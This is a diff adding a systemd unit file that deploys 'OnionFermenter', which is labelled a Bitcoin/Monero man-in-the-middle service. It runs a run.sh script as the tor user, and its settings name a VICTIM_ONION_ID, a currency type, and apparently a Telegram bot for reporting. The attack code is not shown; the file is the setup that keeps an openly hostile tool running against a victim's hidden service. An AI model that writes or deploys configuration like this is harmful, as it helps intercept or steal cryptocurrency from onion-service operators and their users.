@@ -1,0 +1,29 @@
+[Unit]
+Description=OnionFermenter - Bitcoin/Monero MitM Service
+After=network.target tor.service
+Wants=tor.service
+
+[Service]
+Type=simple
+User=tor
+Group=tor
+WorkingDirectory=/opt/onionfermenter
+Environment="VICTIM_ONION_ID=your_victim_onion_id"
+Environment="CURRENCY_TYPE=BTC"
+Environment="TELEGRAM_BOT_TOKEN="
+Environment="TELEGRAM_CHAT_ID="
+ExecStart=/opt/onionfermenter/run.sh
+Restart=always
+RestartSec=10
+StandardOutput=journal
+StandardError=journal
+
+# Security hardening
+NoNewPrivileges=true
+PrivateTmp=true
+ProtectSystem=strict
+ProtectHome=true
+ReadWritePaths=/var/lib/tor
+
+[Install]
+WantedBy=multi-user.target
